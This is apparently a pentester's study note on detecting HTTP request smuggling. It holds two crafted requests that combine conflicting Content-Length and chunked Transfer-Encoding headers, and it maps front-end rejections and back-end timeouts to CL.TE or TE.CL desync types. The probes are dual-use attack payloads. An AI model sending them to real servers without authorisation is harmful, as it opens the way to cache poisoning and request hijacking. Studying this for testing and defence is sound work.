# Pre-requisites

![](../../Attachments/Req%20Smug/Preparing%20Steps%20for%20Http%20Request%20smugglind.png)

# Detection

![](../../Attachments/Req%20Smug/Detection%20HTTP%20Request%20Smuggling.png)

Req 1:
``` HTTP 
POST / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

3
abc
X
```
Req 2:
```HTTP
POST / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X
```


### For Request 1
###### Front-end Rejected -> TE.{CL OR TE}

![](../../Attachments/Req%20Smug/Invalid%20Chunk%20SIze.png)

###### Backend Timeout -> CL.TE

![](../../Attachments/Req%20Smug/Backend%20Timeout%20first%20req.png)

### For Request 2
###### Backend Timeout -> TE.CL

![](../../Attachments/Req%20Smug/Backend%20Timeout%20req%202.png)


